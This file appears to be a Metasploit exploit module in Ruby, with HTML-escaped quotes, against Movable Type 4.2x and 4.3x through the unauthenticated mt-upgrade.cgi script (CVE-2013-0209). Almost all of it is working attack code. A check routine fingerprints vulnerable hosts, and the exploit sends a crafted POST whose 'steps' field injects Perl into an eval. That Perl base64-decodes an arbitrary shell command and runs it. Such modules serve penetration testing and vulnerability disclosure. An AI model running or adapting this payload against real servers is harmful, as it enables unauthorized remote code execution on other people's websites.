# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
 
    include Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Movable Type 4.2x, 4.3x Web Upgrade Remote Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module can be used to execute a payload on MoveableType (MT) that
                    exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi),
                    that is used during installation and updating of the platform.
                    The vulnerability arises due to the following properties:
                    1. This script may be invoked remotely without requiring authentication
                    to any MT instance.
                    2. Through a crafted POST request, it is possible to invoke particular
                    database migration functions (i.e functions that bring the existing
                    database up-to-date with an updated codebase) by name and with
                    particular parameters.
                    3. A particular migration function, core_drop_meta_for_table, allows
                    a class parameter to be set which is used directly in a perl eval
                    statement, allowing perl code injection.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Kacper Nowak&#039;,
                    &#039;Nick Blundell&#039;,
                    &#039;Gary O\&#039;Leary-Steele&#039;
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2012-6315&#039;], # superseded by CVE-2013-0209 (duplicate)
                    [&#039;CVE&#039;, &#039;2013-0209&#039;],
                    [&#039;URL&#039;, &#039;http://www.sec-1.com/blog/?p=402&#039;],
                    [&#039;URL&#039;, &#039;http://www.movabletype.org/2013/01/movable_type_438_patch.html&#039;]
                ],
            &#039;Arch&#039;       => ARCH_CMD,
            &#039;Payload&#039;    =>
                {
                    &#039;Compat&#039; =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;
                        }
                },
            &#039;Platform&#039;   =>
                [
                    &#039;win&#039;,
                    &#039;unix&#039;
                ],
            &#039;Targets&#039;    =>
                [
                    [&#039;Movable Type 4.2x, 4.3x&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Jan 07 2013",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path of the Movable Type installation&#039;, &#039;/mt&#039;])
            ], self.class)
    end
 
    def check
        @peer = "#{rhost}:#{rport}"
        fingerprint = rand_text_alpha(5)
        print_status("#{@peer} - Sending check...")
        begin
            res = http_send_raw(fingerprint)
        rescue Rex::ConnectionError
            return Exploit::CheckCode::Unknown
        end
        if (res)
            if (res.code == 200 and res.body =~ /Can&#039;t locate object method \\"dbi_driver\\" via package \\"#{fingerprint}\\" at/)
                return Exploit::CheckCode::Vulnerable
            elsif (res.code != 200)
                return Exploit::CheckCode::Unknown
            else
                return Exploit::CheckCode::Safe
            end
        else
            return Exploit::CheckCode::Unknown
        end
    end
 
    def exploit
        @peer = "#{rhost}:#{rport}"
        print_status("#{@peer} - Sending payload...")
        http_send_cmd(payload.encoded)
    end
 
    def http_send_raw(cmd)
        path = normalize_uri(target_uri.path) + &#039;/mt-upgrade.cgi&#039;
        pay = cmd.gsub(&#039;\\&#039;, &#039;\\\\&#039;).gsub(&#039;"&#039;, &#039;\"&#039;)
        send_request_cgi(
            {
                &#039;uri&#039;       => path,
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;vars_post&#039; =>
                    {
                        &#039;__mode&#039;     => &#039;run_actions&#039;,
                        &#039;installing&#039; => &#039;1&#039;,
                        &#039;steps&#039;      => %{[["core_drop_meta_for_table","class","#{pay}"]]}
                    }
            })
    end
 
    def http_send_cmd(cmd)
        pay = &#039;v0;use MIME::Base64;system(decode_base64(q(&#039;
        pay << Rex::Text.encode_base64(cmd)
        pay << &#039;)));return 0&#039;
        http_send_raw(pay)
    end
end

